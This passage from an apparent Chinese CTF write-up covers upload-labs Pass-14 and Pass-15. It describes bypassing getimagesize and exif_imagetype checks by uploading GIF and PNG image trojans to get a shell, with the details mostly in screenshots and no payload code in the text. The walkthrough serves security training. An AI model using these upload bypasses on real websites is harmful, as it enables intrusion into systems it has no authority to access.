+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC.jpeg" alt="图片木马" style="zoom:50%;">
+
+<p>上传getshell：</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2010.17.51.png" style="zoom:50%;">
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2010.10.27.png" style="zoom:40%;">
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2010.18.24.png" style="zoom:50%;">
+
+<h2 id="14-3-gif图片木马"><a href="#14-3-gif图片木马" class="headerlink" title="14.3 gif图片木马"></a>14.3 gif图片木马</h2><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2009.25.22.png" style="zoom:50%;">
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2009.39.32.png" style="zoom:50%;">
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2009.35.16.png" style="zoom:50%;">
+
+<p>gif还是可以用老方法绕过检测。</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2009.42.04.png" style="zoom:50%;">
+
+<p>另外可以看到，文件最终的后缀跟文件名filename的后缀没有必然联系，主要依赖于getiamgesize提取的文件名。</p>
+<h2 id="14-4-png图片木马"><a href="#14-4-png图片木马" class="headerlink" title="14.4 png图片木马"></a>14.4 png图片木马</h2><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2009.38.22.png" style="zoom:50%;">
+
+<p>成功上传。</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2009.40.17.png" style="zoom:50%;">
+
+<p>png木马也适用。</p>
+<h1 id="十五、Pass-15（exif-imagetype文件头检测-图片木马）"><a href="#十五、Pass-15（exif-imagetype文件头检测-图片木马）" class="headerlink" title="十五、Pass-15（exif_imagetype文件头检测-图片木马）"></a>十五、Pass-15（exif_imagetype文件头检测-图片木马）</h1><h2 id="15-1-题面"><a href="#15-1-题面" class="headerlink" title="15.1 题面"></a>15.1 题面</h2><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2010.36.02.png" style="zoom:50%;">
+
+<p>更上一关一样。</p>
+<h2 id="15-2-gif图片木马"><a href="#15-2-gif图片木马" class="headerlink" title="15.2 gif图片木马"></a>15.2 gif图片木马</h2><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2010.38.16.png" style="zoom:50%;">
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2010.39.38.png" style="zoom:50%;">
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2010.40.04.png" style="zoom:50%;">
+
+<p>按照老方法操作，成功getshell。</p>
+<h2 id="15-3-png图片木马"><a href="#15-3-png图片木马" class="headerlink" title="15.3 png图片木马"></a>15.3 png图片木马</h2><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/01/02/ctf-shi-zhan/web-buuoj-upload-labs-linux-wen-jian-shang-chuan/%E6%88%AA%E5%B1%8F2025-01-24%2010.41.59.png" style="zoom:50%;">
+
+<p>同理上传png木马。这里特意没有改filename的后缀，最终上传的时候其实上传的是png后缀，说明后缀名是根据文件的类型提取的。MIME类型是php也能上传成功，说明没有做MIME类型检测。</p>
